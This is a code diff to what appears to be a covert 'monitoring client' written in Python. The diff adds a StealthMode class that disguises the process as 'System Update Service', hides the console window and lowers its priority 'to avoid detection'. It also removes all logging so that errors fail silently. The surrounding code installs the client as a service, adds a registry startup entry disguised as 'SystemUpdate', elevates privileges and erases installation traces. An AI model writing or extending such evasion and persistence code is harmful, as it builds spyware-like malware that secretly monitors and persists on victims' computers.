@@ -4,7 +4,6 @@ import os
 import sys
 import platform
 import subprocess
-import logging
 
 # Conditional import for Windows registry
 try:
@@ -14,6 +13,56 @@ try:
         winreg = None
 except ImportError:
     winreg = None
+
+class StealthMode:
+    def __init__(self):
+        self.system = platform.system()
+        self.process_name = "System Update Service"
+        
+    def enable_stealth(self):
+        """Enable maximum stealth mode"""
+        try:
+            # Set process name to look like system service
+            self._disguise_process()
+            
+            # Disable console window on Windows
+            if self.system == 'Windows':
+                self._hide_console_window()
+            
+            # Set low priority to avoid detection
+            self._set_low_priority()
+            
+        except Exception:
+            pass  # Silent failure
+    
+    def _disguise_process(self):
+        """Disguise the process name"""
+        try:
+            if self.system == 'Windows':
+                import ctypes
+                ctypes.windll.kernel32.SetConsoleTitleW(self.process_name)
+        except:
+            pass
+    
+    def _hide_console_window(self):
+        """Hide console window on Windows"""
+        try:
+            import ctypes
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+        except:
+            pass
+    
+    def _set_low_priority(self):
+        """Set process priority to low to avoid detection"""
+        try:
+            import psutil
+            process = psutil.Process()
+            if self.system == 'Windows':
+                process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
+            else:
+                process.nice(19)  # Lowest priority on Unix
+        except:
+            pass
 
 class StealthManager:
     def __init__(self):
@@ -46,8 +95,8 @@ class StealthManager:
                 self.hide_process_windows()
             elif self.system == 'Darwin':
                 self.hide_process_macos()
-        except Exception as e:
-            logging.error(f"Error hiding process: {str(e)}")
+        except Exception:
+            pass
             
     def hide_process_windows(self):
         """Hide process on Windows"""
@@ -62,8 +111,8 @@ class StealthManager:
             
             # This is a simplified approach - full stealth requires more advanced techniques
             
-        except Exception as e:
-            logging.error(f"Windows stealth error: {str(e)}")
+        except Exception:
+            pass
             
     def hide_process_macos(self):
         """Hide process on macOS"""
@@ -71,8 +120,8 @@ class StealthManager:
             # Hide from Activity Monitor (limited effectiveness)
             # Full stealth on macOS requires different approaches
             pass
-        except Exception as e:
-            logging.error(f"macOS stealth error: {str(e)}")
+        except Exception:
+            pass
             
     def install_as_service(self):
         """Install client as system service"""
@@ -81,8 +130,8 @@ class StealthManager:
                 self.install_windows_service()
             elif self.system == 'Darwin':
                 self.install_macos_service()
-        except Exception as e:
-            logging.error(f"Service installation error: {str(e)}")
+        except Exception:
+            pass
             
     def install_windows_service(self):
         """Install as Windows service"""
@@ -105,15 +154,11 @@ class StealthManager:
             result = subprocess.run(install_cmd, capture_output=True, text=True)
             
             if result.returncode == 0:
-                logging.info("Windows service installed successfully")
-                
                 # Start the service
                 subprocess.run(['sc', 'start', service_name], capture_output=True)
-            else:
-                logging.error(f"Service installation failed: {result.stderr}")
-                
-        except Exception as e:
-            logging.error(f"Windows service installation error: {str(e)}")
+            
+        except Exception:
+            pass
             
     def install_macos_service(self):
         """Install as macOS Launch Agent"""
@@ -155,10 +200,9 @@ class StealthManager:
                 
             # Load the agent
             subprocess.run(['launchctl', 'load', plist_path], capture_output=True)
-            logging.info("macOS Launch Agent installed successfully")
             
-        except Exception as e:
-            logging.error(f"macOS service installation error: {str(e)}")
+        except Exception:
+            pass
             
     def add_to_startup(self):
         """Add to system startup"""
@@ -167,8 +211,8 @@ class StealthManager:
                 self.add_to_windows_startup()
             elif self.system == 'Darwin':
                 self.add_to_macos_startup()
-        except Exception as e:
-            logging.error(f"Startup addition error: {str(e)}")
+        except Exception:
+            pass
             
     def add_to_windows_startup(self):
         """Add to Windows startup registry"""
@@ -184,9 +228,8 @@ class StealthManager:
                 winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, command)
                 winreg.CloseKey(key)
                 
-                logging.info("Added to Windows startup registry")
-        except Exception as e:
-            logging.error(f"Windows startup error: {str(e)}")
+        except Exception:
+            pass
             
     def add_to_macos_startup(self):
         """Add to macOS login items (simplified)"""
@@ -194,8 +237,8 @@ class StealthManager:
             # This would typically use LaunchAgents (already implemented above)
             # or Login Items through AppleScript
             pass
-        except Exception as e:
-            logging.error(f"macOS startup error: {str(e)}")
+        except Exception:
+            pass
             
     def is_admin(self):
         """Check if running with admin/root privileges"""
@@ -221,8 +264,8 @@ class StealthManager:
                     None, "runas", sys.executable, f'"{script}" {params}', None, 1
                 )
                 sys.exit()
-        except Exception as e:
-            logging.error(f"Privilege elevation error: {str(e)}")
+        except Exception:
+            pass
             
     def cleanup_traces(self):
         """Clean up installation traces"""
@@ -241,8 +284,8 @@ class StealthManager:
                     except Exception:
                         pass
                         
-        except Exception as e:
-            logging.error(f"Cleanup error: {str(e)}")
+        except Exception:
+            pass
             
     def uninstall(self):
         """Uninstall the monitoring client"""
@@ -259,11 +302,9 @@ class StealthManager:
             import shutil
             if os.path.exists(self.hidden_dir):
                 shutil.rmtree(self.hidden_dir)
-                
-            logging.info("Client uninstalled successfully")
             
-        except Exception as e:
-            logging.error(f"Uninstall error: {str(e)}")
+        except Exception:
+            pass
             
     def remove_from_windows_startup(self):
         """Remove from Windows startup"""
